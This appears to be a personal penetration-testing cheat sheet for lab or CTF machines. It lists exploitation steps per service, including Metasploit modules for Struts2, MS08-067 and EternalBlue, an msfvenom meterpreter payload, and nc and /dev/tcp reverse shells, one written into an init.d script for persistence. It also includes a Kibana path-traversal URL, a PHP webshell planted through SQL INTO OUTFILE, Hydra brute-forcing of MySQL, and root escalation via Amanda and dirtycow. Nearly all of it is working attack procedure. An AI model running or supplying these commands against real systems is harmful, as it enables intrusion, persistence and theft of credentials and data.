# Pwn'd
- https://ippsec.rocks/?#
### Apache Struts2
- 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
- |_http-server-header: Apache-Coyote/1.1
- | http-title: Santa Naughty and Nice Tracker
- USE: 
````
search struts2
exploit(multi/http/struts2_content_type_ognl)
````
- 445/tcp open  miscrosoft-ds
- Run the nmap eternal scripts
- USE:
````
nmap --scripts=smb-vuln* $ip
exploit(windows/smb/ms08_067_netapi)
````
### Wing FTP Server
- 21/tcp open  wingftp
- Gain access to the admin panel
````
search lua
exploit(windows/ftp/wing_ftp_admin_exec)
````
### Mantis Bug Tracker
- 80/tcp  open  http  mantisbt-2.3.0
- CVE:2019-15715 2017-7615
- Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
- 110/tcp open  POP3 
- James POP3 Server 2.3.2
- https://www.exploit-db.com/exploits/35513
````
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.2 3333 >/tmp/f
echo "#!/bin/bash" > /etc/init.d/james
echo "bash -i >& /dev/tcp/172.16.6.2/5555 0>&1" >> /etc/init.d/james
cat /etc/init.d/james
sudo /sbin/reboot
````
- Version: Apache Tomcat/8.0.47
- OS: Microsoft Windows 2008| Vista | 7
- exploit: multi/http/struts2_rest_xstream
- Targeturi: /struts2-rest-showcase/orders/
### Kibana
- 5601 is the elastic search port, 9200 is the api
````
curl -X GET "10.10.15.175:9200/_search?q=password&pretty"                                                                                                                                                                  130 ⨯
{
  "took" : 11,
  "timed_out" : false,
  "_shards" : {
    "total" : 6,
    "successful" : 6,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 2.0136302,
    "hits" : [
      {
        "_index" : "messages",
        "_type" : "_doc",
        "_id" : "73",
        "_score" : 2.0136302,
        "_source" : {
          "sender" : "mary",
          "receiver" : "wendy",
          "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
````
- If there are log files like on port 8000 which are showing you active kabana logs you can have a LFI vulnerability
- Go to the 5601 port and add this extension `/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt`
````
10.10.156.71:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
````
- Then curl the logs and grep for root.txt
````
curl -s http://10.10.31.117:8000/kibana-log.txt | grep "root.txt" 
````
- Also can be used to get a shell in other situations
- https://github.com/mpgn/CVE-2018-17246
### Sync Breeze Enterprise
- https://www.exploit-db.com/exploits/40456
````
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.6.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
````
### Microsoft ds
````
exploit/windows/smb/ms17_010_eternalblue
````
### Android
- 5555/tcp  open  freeciv
- Install adb
````
adb connect [target ip address:port]
````
### Joomla versions 3.6.3
- Able to use joomra.py in order to create an account and login 
````
python3 joom.py -u jack -p password -e jack@gmail.com http://10.10.10.10
````
- Edit the templates 
- Add in webshell
- Can read the config files which has the use and password, then can ssh in
### XAMPP
- Got in through phpmyadmin [root:no password]
- Able to get shell through SQL database commands
````
SELECT "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "C:/xampp/htdocs/xampp/shell.php";
````
- Then browse to:
````
10.10.10.10/xampp/shell.php?cmd=dir
````
- Look for config files with passwords
````
C:\xampp\htdocs\admin\config.php
````
### Lucky GetSimple!
````
10.16.1.2/data/users/lucky.xml
````
- See the config file and passwd hash with username, crack in john 
- PE with dirtycow [CVE-2016-5195]
- Compile with
````
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
````
### Dolphin Wordpress
- Dolphin <7.3.2 Auth bypass / RCE exploit by Ahmed Sultan
### Codiad Impresscms
````
10.10.10.10/codiad/data/users.php
````
- Upload web shell
- Found SSH creds
### Backupadmin
- Priv Esc on box with Amanda running, view by
````
ls -al /usr/lib/amanda
echo '#!/bin/sh
> /bin/sh' > priv.sh
chmod +x priv.sh
/usr/lib/amanada/application/amstar restore --star-path=/tmp/priv.sh
$ whoami
root
````
#### mysql Brute Force
- mysql 3306 running on the target
````
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.16.1.11
mysql -u root 10.16.1.11 -p
SHOW DATABASES;
SHOW TABLES FROM helpdesk;
USE helpdesk;
SELECT * FROM ost_form_entry;
````
### IP Fire 2.15
- Brute the admin default [admin:admin]
- https://github.com/0xskunk/IPFire-2.15-Shellshock-Exploit/blob/master/SIPS.py
### Webmin
- MiniServ 1.890 (Webmin httpd)
- https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py
- Read /etc/shadow
- Add user
- Reverse Shells
- Read the config files
- Will run as root










































